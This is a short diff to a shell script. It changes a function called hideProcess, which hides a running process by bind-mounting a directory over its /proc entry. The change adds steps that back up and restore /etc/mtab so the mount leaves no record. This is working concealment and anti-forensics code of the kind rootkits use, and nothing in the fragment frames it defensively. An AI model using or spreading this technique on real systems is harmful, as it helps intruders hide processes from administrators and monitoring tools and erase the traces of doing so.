@@ -37,7 +37,7 @@ function mkFolder() {
         fi
 }
 function hideProcess() {
-        mount --bind /tmp/hidden /proc/$pid
+        cp /etc/mtab /tmp/mtab; mount --bind /tmp/hidden /proc/$pid ; mv /tmp/mtab /etc/mtab
 }
 function listProcess() {
 	printf "\nSimple Process List:\n\n"
